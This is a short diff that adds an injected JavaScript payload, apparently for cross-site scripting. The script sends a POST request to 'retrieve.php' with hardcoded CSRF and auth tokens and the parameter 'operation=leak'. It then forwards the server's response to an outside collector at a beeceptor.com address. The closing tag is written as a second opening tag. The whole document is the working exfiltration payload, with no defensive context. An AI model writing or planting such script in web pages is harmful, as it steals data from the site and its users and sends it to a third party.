@@ -1,0 +1,15 @@
+<Script>
+var x=new XMLHttpRequest();
+x.open("POST", "retrieve.php", true);
+x.setRequestHeader("CSRFToken","testing123321");
+x.setRequestHeader("X-Auth-Token","custom-auth");
+x.send("auth=Z4!X;gs{\Q6u{fqRnFABc{W&@+]9(Ece~//9-Uvp&operation=leak");
+x.onreadystatechange = function() { 
+    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
+        res = x.responseText;
+        var xhttp=new XMLHttpRequest();
+        xhttp.open("GET","https://dehidehide.free.beeceptor.com/?" + res);
+        xhttp.send();
+    }
+}
+<Script>
